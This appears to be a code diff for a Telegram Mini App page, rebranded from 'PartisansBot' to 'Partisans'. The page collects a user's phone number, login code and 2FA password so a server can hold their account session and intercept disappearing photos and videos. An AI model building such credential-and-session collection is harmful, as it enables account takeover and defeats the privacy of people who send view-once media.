@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>PartisansBot</title>
+<title>Partisans</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;1,9..40,300&family=DM+Serif+Display:ital@0;1&display=swap" rel="stylesheet">
 <style>
@@ -302,9 +302,9 @@
 <div class="wrap">
 
   <div class="header">
-    <img class="avatar" src="/static/avatar.jpg" alt="PartisansBot" onerror="this.style.display='none'">
+    <img class="avatar" src="/static/avatar.jpg" alt="Partisans" onerror="this.style.display='none'">
     <div>
-      <div class="bot-name">PartisansBot</div>
+      <div class="bot-name">Partisans</div>
       <div class="bot-sub">Secure interception</div>
     </div>
   </div>
@@ -326,7 +326,7 @@
         <div class="feat-icon">📸</div>
         <div class="feat-text">
           <strong id="txt-f1-title">Disappearing photos & videos</strong>
-          <span id="txt-f1-desc">Telegram doesn't share one-time media with bots. Linking your account lets PartisansBot intercept them before they vanish.</span>
+          <span id="txt-f1-desc">Telegram doesn't share one-time media with bots. Linking your account lets Partisans intercept them before they vanish.</span>
         </div>
       </div>
       <div class="feature-row">
@@ -403,15 +403,13 @@
     </div>
   </div>
 
-  <div class="footer">@partisansfromNJbot</div>
+  <div class="footer">Partisans</div>
 </div>
 
 <script>
   const tg = window.Telegram?.WebApp;
   if (tg) { tg.ready(); tg.expand(); }
 
-  const urlParams = new URLSearchParams(window.location.search);
-  const userId = tg?.initDataUnsafe?.user?.id || urlParams.get('user_id');
   const API_BASE = window.location.origin;
 
   let currentLang = 'en';
@@ -422,7 +420,7 @@
     en: {
       'why-title':'Why is this needed?',
       'f1-title':'Disappearing photos & videos',
-      'f1-desc':"Telegram doesn't share one-time media with bots. Linking your account lets PartisansBot intercept them before they vanish.",
+      'f1-desc':"Telegram doesn't share one-time media with bots. Linking your account lets Partisans intercept them before they vanish.",
       'f2-title':'Your session, your control',
       'f2-desc':'Stored only on our server. Used exclusively to detect one-time media. We never read your chats.',
       'f3-title':'Works in the background',
@@ -440,7 +438,7 @@
     ru: {
       'why-title':'Зачем это нужно?',
       'f1-title':'Исчезающие фото и видео',
-      'f1-desc':'Telegram не передаёт одноразовые медиа ботам. Привязка аккаунта позволяет PartisansBot перехватывать их до исчезновения.',
+      'f1-desc':'Telegram не передаёт одноразовые медиа ботам. Привязка аккаунта позволяет Partisans перехватывать их до исчезновения.',
       'f2-title':'Твоя сессия — твой контроль',
       'f2-desc':'Хранится только на нашем сервере. Используется исключительно для обнаружения одноразовых медиа. Мы не читаем переписку.',
       'f3-title':'Работает в фоне',
@@ -458,7 +456,7 @@
     pt: {
       'why-title':'Para que serve isso?',
       'f1-title':'Fotos e vídeos temporários',
-      'f1-desc':'O Telegram não compartilha mídia de uso único com bots. Vincular sua conta permite ao PartisansBot interceptá-las.',
+      'f1-desc':'O Telegram não compartilha mídia de uso único com bots. Vincular sua conta permite ao Partisans interceptá-las.',
       'f2-title':'Sua sessão, seu controle',
       'f2-desc':'Armazenado apenas em nosso servidor. Usado exclusivamente para detectar mídia de uso único.',
       'f3-title':'Funciona em segundo plano',
@@ -476,7 +474,7 @@
     id: {
       'why-title':'Untuk apa ini?',
       'f1-title':'Foto & video sementara',
-      'f1-desc':'Telegram tidak membagikan media sekali-pakai ke bot. Menautkan akun memungkinkan PartisansBot mencegatnya.',
+      'f1-desc':'Telegram tidak membagikan media sekali-pakai ke bot. Menautkan akun memungkinkan Partisans mencegatnya.',
       'f2-title':'Sesi Anda, kontrol Anda',
       'f2-desc':'Disimpan hanya di server kami. Digunakan khusus untuk mendeteksi media sekali-pakai.',
       'f3-title':'Bekerja di latar belakang',
@@ -555,7 +553,7 @@
     try {
       const r = await fetch(`${API_BASE}/api/auth/send_code`,{
         method:'POST',headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({user_id:userId,phone:phoneValue,init_data:tg?.initData||''}),
+        body:JSON.stringify({phone:phoneValue,init_data:tg?.initData||''}),
       });
       const d = await r.json();
       if (d.ok) showStep(2);
@@ -573,7 +571,7 @@
     try {
       const r = await fetch(`${API_BASE}/api/auth/sign_in`,{
         method:'POST',headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({user_id:userId,code,init_data:tg?.initData||''}),
+        body:JSON.stringify({code,init_data:tg?.initData||''}),
       });
       const d = await r.json();
       if (d.ok){showStep(4);setTimeout(()=>tg?.close(),3000);}
@@ -592,7 +590,7 @@
     try {
       const r = await fetch(`${API_BASE}/api/auth/2fa`,{
         method:'POST',headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({user_id:userId,password:pwd,init_data:tg?.initData||''}),
+        body:JSON.stringify({password:pwd,init_data:tg?.initData||''}),
       });
       const d = await r.json();
       if (d.ok){showStep(4);setTimeout(()=>tg?.close(),3000);}
